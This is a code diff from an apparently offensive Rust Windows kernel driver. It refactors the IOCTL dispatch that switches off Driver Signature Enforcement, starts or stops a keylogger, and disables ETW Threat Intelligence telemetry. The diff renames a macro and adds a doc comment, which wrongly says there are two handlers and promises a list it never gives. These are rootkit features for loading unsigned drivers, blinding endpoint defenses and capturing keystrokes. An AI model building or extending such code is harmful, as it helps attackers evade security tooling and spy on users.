@@ -5,15 +5,24 @@ use {
     shared::structs::{Keylogger, DSE, ETWTI},
     wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
     shared::ioctls::{IOCTL_ENABLE_DSE, IOCTL_KEYLOGGER, IOCTL_ETWTI}, 
-    crate::{handle_driver, misc::{etwti::Etw, dse::Dse}, utils::ioctls::IoctlHandler}, 
+    crate::{handle, misc::{etwti::Etw, dse::Dse}, utils::ioctls::IoctlHandler}, 
 };
 
+/// Registers the IOCTL handlers for misc-related operations.
+///
+/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
+/// their respective IOCTL codes. The two operations supported are:
+///
+/// # Parameters
+/// 
+/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the misc-related
+///   IOCTL handlers will be inserted.
+///
 pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
-
     // Responsible for enabling/disabling DSE.
     ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_ENABLE_DSE");
-        let status = unsafe { handle_driver!(stack, Dse::set_dse_state, DSE) };
+        let status = unsafe { handle!(stack, Dse::set_dse_state, DSE) };
         unsafe { (*irp).IoStatus.Information = 0 };
         
         match status {
@@ -25,7 +34,7 @@ pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Start / Stop Keylogger
     ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_KEYLOGGER");
-        let status = unsafe { handle_driver!(stack, set_keylogger_state, Keylogger) };
+        let status = unsafe { handle!(stack, set_keylogger_state, Keylogger) };
         unsafe { (*irp).IoStatus.Information = 0 };
 
         status
@@ -34,7 +43,7 @@ pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Responsible for enabling/disabling ETWTI.
     ioctls.insert(IOCTL_ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_ETWTI");
-        let status = unsafe { handle_driver!(stack, Etw::etwti_enable_disable, ETWTI) };
+        let status = unsafe { handle!(stack, Etw::etwti_enable_disable, ETWTI) };
         unsafe { (*irp).IoStatus.Information = 0 };
 
         match status {
